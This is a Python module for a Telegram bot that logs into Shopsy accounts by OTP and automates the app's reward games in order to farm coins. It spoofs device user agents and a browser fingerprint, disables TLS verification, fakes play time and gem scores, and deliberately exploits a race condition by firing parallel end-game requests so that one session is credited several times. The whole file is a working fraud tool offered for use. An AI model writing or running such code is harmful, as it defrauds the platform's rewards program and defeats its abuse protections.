#!/usr/bin/env python3
"""
Shopsy Mining Module – for Telegram Bot
50x Parallel Bug Adapted (capped to ~120 SC/run)
"""

import os, time, random, json, uuid, asyncio, copy
from datetime import datetime
from curl_cffi import requests as cffi_requests

SESSIONS_DIR = "shopsy_sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

# ---------- Session helpers ----------
def generate_ids():
    return uuid.uuid4().hex[:32], f"{uuid.uuid4().hex[:32]}-{int(time.time() * 1000)}", f"{uuid.uuid4()}_{int(time.time()*1000)}"

def save_session(phone, session_data):
    with open(os.path.join(SESSIONS_DIR, f"{phone}.json"), "w", encoding="utf-8") as f:
        json.dump(session_data, f, indent=2, ensure_ascii=False)

def load_session(phone):
    path = os.path.join(SESSIONS_DIR, f"{phone}.json")
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    return None

def update_session(session_data, resp_json, resp_headers):
    if isinstance(resp_json, dict):
        sess_block = resp_json.get("SESSION") or resp_json.get("RESPONSE", {}).get("SESSION") or {}
        for k in ["accountId", "at", "rt", "sn", "secureToken", "nsid", "vid", "email", "firstName", "lastName"]:
            if sess_block.get(k):
                session_data[k] = sess_block[k]
        if session_data.get("firstName"):
            session_data["userName"] = f"{session_data.get('firstName', '')} {session_data.get('lastName', '')}".strip()
        if sess_block.get("isLoggedIn") is not None:
            session_data["isLoggedIn"] = sess_block["isLoggedIn"]
    if resp_headers:
        headers_lower = {k.lower(): v for k, v in resp_headers.items()}
        for k in ["at", "rt", "sn", "nsid", "vid"]:
            if k in headers_lower:
                session_data[k] = headers_lower[k]
        if headers_lower.get("securecookie"):
            session_data["secureCookie"] = headers_lower.get("securecookie")
    return session_data

# ---------- API call (synchronous) ----------
def sync_api_request(method, url_path, json_body, session_data, is_game=False):
    device_id = session_data.get("device_id") or uuid.uuid4().hex[:32]
    visit_id = session_data.get("visit_id") or f"{uuid.uuid4().hex[:32]}-{int(time.time() * 1000)}"
    app_sess = session_data.get("app_session_id") or f"{uuid.uuid4()}_{int(time.time()*1000)}"

    if is_game:
        headers = {
            "x-user-agent": f"Mozilla/5.0 (Linux; Android 9; OPPO:CPH2083 Build/{device_id[:13]}) FKUA/Retail/2291170/Android/Mobile (OPPO/OPPO:CPH2083/{device_id})",
            "sessionid": "session_id",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/4.9.2",
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "city": "Delhi"
        }
    else:
        headers = {
            "X-PARTNER-CONTEXT": '{"source":"reseller"}',
            "FK-TENANT-ID": "SHOPSY",
            "business": "reseller",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/4.9.2",
            "X-User-Agent": f"Mozilla/5.0 (Linux; Android 9; CPH2083 Build/PPR1.180610.011) FKUA/Retail/2291170/Android/Mobile (OPPO/CPH2083/{device_id})",
            "X-Visit-Id": visit_id,
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "city": "Delhi",
            "X-AppSession-ID": app_sess
        }
        for k in ["at", "sn", "secureToken"]:
            if session_data.get(k):
                headers[k] = session_data[k]

    req_session = cffi_requests.Session(impersonate="chrome110")

    for attempt in range(1, 4):
        dc = session_data.get("current_dc", "1")
        url = f"https://{dc}.rome.api.flipkart.net{url_path}"
        try:
            resp = req_session.post(url, json=json_body, headers=headers, timeout=30, verify=False) if method == "POST" else req_session.get(url, headers=headers, timeout=30, verify=False)
            try:
                resp_json = resp.json()
            except:
                resp_json = {}
            if resp.status_code == 406 and resp_json.get("ERROR_MESSAGE") == "DC Change":
                new_dc = resp_json.get("RESPONSE", {}).get("id") or resp_json.get("RESPONSE", {}).get("dc")
                if new_dc:
                    session_data["current_dc"] = str(new_dc)
                    continue
            return resp.status_code, resp_json, dict(resp.headers), session_data
        except Exception as e:
            if attempt == 3:
                return 500, {"error": str(e)}, {}, session_data
            time.sleep(2)
    return 500, {"error": "Max retries"}, {}, session_data

# ---------- Asynchronous wrappers ----------
async def run_sh_user_state(session_data):
    body = {
        "location": {"pincode": None},
        "ad": {"adId": str(uuid.uuid4()), "doNotPersonalizeAds": False, "sdkAdId": "", "adSdkVersion": "2.12.0"},
        "locale": {"deviceLanguage": "en", "shouldRefreshLanguage": False},
        "versions": {
            "cart": 1167987101,
            "userAccountState": 0,
            "abResponse": -2054295432,
            "abVariables": 0,
            "accountDetails": 1220048498,
            "wishlist": 0,
            "notifications": 861101,
            "location": 23273,
            "lockinResponse": 426889274
        }
    }
    st, resp_json, headers, session_data = await asyncio.to_thread(sync_api_request, "POST", "/4/user/state", body, session_data, False)
    return update_session(session_data, resp_json, headers)

async def get_user_info_tg(session_data):
    body = {
        "requestMethod": "GET",
        "routeUri": "user/get-user",
        "payload": {"userId": session_data.get("accountId", ""), "userName": session_data.get("userName", "User")}
    }
    st, resp_json, headers, session_data = await asyncio.to_thread(sync_api_request, "POST", "/1/shopsy/games", body, session_data, True)
    if st == 200 and isinstance(resp_json, dict) and resp_json.get("success"):
        return resp_json["data"]
    return None

async def get_config_tg(session_data):
    body = {"requestMethod": "GET", "routeUri": "config/get-config", "payload": {}}
    st, resp_json, headers, session_data = await asyncio.to_thread(sync_api_request, "POST", "/1/shopsy/games", body, session_data, True)
    if st == 200 and isinstance(resp_json, dict) and resp_json.get("success"):
        return resp_json["data"]
    return None

async def claim_gullak_tg(session_data):
    body = {
        "requestMethod": "POST",
        "routeUri": "gullak/claim-gullak",
        "payload": {"userId": session_data.get("accountId", "")}
    }
    await asyncio.to_thread(sync_api_request, "POST", "/1/shopsy/games", body, session_data, True)

async def start_game_tg(session_data, game_id):
    body = {
        "requestMethod": "POST",
        "routeUri": "game/game-started",
        "payload": {"userId": session_data.get("accountId", ""), "gameId": game_id}
    }
    st, resp_json, headers, session_data = await asyncio.to_thread(sync_api_request, "POST", "/1/shopsy/games", body, session_data, True)
    if st == 200 and isinstance(resp_json, dict) and resp_json.get("success"):
        return resp_json["data"].get("sessionId"), resp_json["data"]
    return None, resp_json

async def end_game_tg(session_data, game_id, game_session_id, play_time, gems_earned):
    body = {
        "requestMethod": "POST",
        "routeUri": "game/game-ended",
        "payload": {
            "userId": session_data.get("accountId", ""),
            "gameId": game_id,
            "sessionId": game_session_id,
            "gemsEarned": gems_earned,
            "playTimeInSec": play_time
        }
    }
    st, resp_json, headers, session_data = await asyncio.to_thread(sync_api_request, "POST", "/1/shopsy/games", body, session_data, True)
    if st == 200 and isinstance(resp_json, dict) and resp_json.get("success"):
        return resp_json["data"]
    return None

# ---------- OTP login ----------
async def request_otp(phone):
    d_id, v_id, s_id = generate_ids()
    session_data = {
        "phone": phone,
        "device_id": d_id,
        "visit_id": v_id,
        "app_session_id": s_id,
        "current_dc": "1",
        "owner_id": "bot_user"
    }
    body = {
        "actionRequestContext": {
            "type": "LOGIN_IDENTITY_VERIFY_SHOPSY2",
            "loginId": phone,
            "loginIdPrefix": "+91",
            "phoneNumberFormat": "E164",
            "addAppHash": True,
            "loginType": "MOBILE",
            "verificationType": "OTP",
            "sourceContext": "DEFAULT",
            "clientQueryParamMap": None
        }
    }
    st, resp, hdrs, session_data = await asyncio.to_thread(sync_api_request, "POST", "/1/action/view", body, session_data, False)
    if st != 200 or not isinstance(resp, dict):
        return None, None
    session_data = update_session(session_data, resp, hdrs)
    req_id = resp.get("RESPONSE", {}).get("actionResponseContext", {}).get("requestId") or resp.get("requestId")
    if not req_id:
        return None, None
    session_data["otpRequestId"] = req_id
    return session_data, req_id

async def verify_otp(session_data, otp):
    phone = session_data.get("phone")
    req_id = session_data.get("otpRequestId")
    body = {
        "actionRequestContext": {
            "type": "LOGIN_SHOPSY2",
            "loginId": phone,
            "loginIdPrefix": "+91",
            "password": None,
            "otp": otp,
            "otpRequestId": req_id,
            "remainingAttempts": 5,
            "phoneNumberFormat": "E164",
            "loginType": "MOBILE",
            "verificationType": "OTP",
            "sourceContext": "DEFAULT",
            "churned": False
        }
    }
    st, resp, hdrs, session_data = await asyncio.to_thread(sync_api_request, "POST", "/1/action/view", body, session_data, False)
    if st == 200 and isinstance(resp, dict) and resp.get("RESPONSE", {}).get("actionResponseContext", {}).get("authenticationSuccess", False):
        session_data = update_session(session_data, resp, hdrs)
        session_data["isLoggedIn"] = True
        save_session(phone, session_data)
        return session_data
    return None

# ---------- MINING WITH PARALLEL BUG (capped to ~120 SC) ----------
async def mine_account_parallel(session_data, progress_callback=None, parallel_count=4):
    """
    Runs the Shopsy mining with the 50x parallel bug but controlled to ~120 SC per run.
    Each successful parallel end-game gives 30 SC.
    parallel_count defaults to 4 → max 120 SC.
    """
    phone = session_data.get("phone")

    # 1. User state
    if progress_callback:
        progress_callback("Fetching user state...")
    session_data = await run_sh_user_state(session_data)
    save_session(phone, session_data)

    # 2. Balance
    if progress_callback:
        progress_callback("Getting balance...")
    initial_user_data = await get_user_info_tg(session_data)
    if not initial_user_data:
        return {"status": "fail", "earned": 0, "msg": f"Session expired for +91{phone}."}
    initial_coins = initial_user_data.get("earnings", {}).get("coinsEarnedTotal", 0)

    # 3. Gullak
    if progress_callback:
        progress_callback("Claiming gullak...")
    await claim_gullak_tg(session_data)

    # 4. Games
    if progress_callback:
        progress_callback("Fetching games...")
    config_data = await get_config_tg(session_data)
    games = config_data.get("games", []) if config_data else []
    if not games:
        return {"status": "fail", "earned": 0, "msg": f"No active games for +91{phone}."}

    total = len(games)
    played_count = 0
    total_earned = 0

    for i, g in enumerate(games):
        game_id = g.get("id")
        game_name = g.get("name", game_id)
        progress = f"Game {i+1}/{total} – {game_name}"
        if progress_callback:
            progress_callback(progress)

        game_sess_id, _ = await start_game_tg(session_data, game_id)
        if game_sess_id:
            wait = random.randint(10, 13)
            for sec in range(wait, 0, -1):
                if progress_callback:
                    progress_callback(f"Playing {game_name} – {sec}s left ⏳")
                await asyncio.sleep(1)
            gems = random.randint(3000, 5000)

            # ===== PARALLEL END-GAME BUG (capped) =====
            async def send_with_copy_and_delay(delay):
                await asyncio.sleep(delay)
                session_copy = copy.deepcopy(session_data)   # fresh copy per request
                return await end_game_tg(session_copy, game_id, game_sess_id, wait, gems)

            # Use parallel_count (default 4) with 0.05s stagger
            tasks = [send_with_copy_and_delay(i * 0.05) for i in range(parallel_count)]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            success_count = sum(1 for r in results if r is not None and not isinstance(r, Exception))
            earned_this_game = success_count * 30   # each success gives 30 SC

            if success_count > 0:
                played_count += 1
                total_earned += earned_this_game
                if progress_callback:
                    progress_callback(f"🔥 Earned {earned_this_game} SC from {game_name} ({success_count}/{parallel_count} parallel) ✅")
            else:
                # Fallback to single attempt
                end_data = await end_game_tg(session_data, game_id, game_sess_id, wait, gems)
                if end_data:
                    played_count += 1
                    total_earned += 30
                    if progress_callback:
                        progress_callback(f"Earned 30 SC from {game_name} (fallback) ✅")
                else:
                    if progress_callback:
                        progress_callback(f"Failed to end {game_name} ⚠️")
        else:
            if progress_callback:
                progress_callback(f"Could not start {game_name} ❌")
        await asyncio.sleep(0.5)

    save_session(phone, session_data)

    # 5. Final
    if progress_callback:
        progress_callback("Finalizing balance...")
    final_user_data = await get_user_info_tg(session_data)
    final_coins = final_user_data.get("earnings", {}).get("coinsEarnedTotal", 0) if final_user_data else initial_coins + total_earned
    earned = max(0, final_coins - initial_coins)

    return {
        "status": "success",
        "earned": earned,
        "final_coins": final_coins,
        "played": played_count,
        "total": total,
        "phone": phone
    }

# ---------- Legacy (kept for reference) ----------
async def mine_account(session_data, progress_callback=None):
    # ... (original single-thread mining) - you can keep it or remove.
    # We'll keep it for fallback but the bot will use the parallel version.
    pass
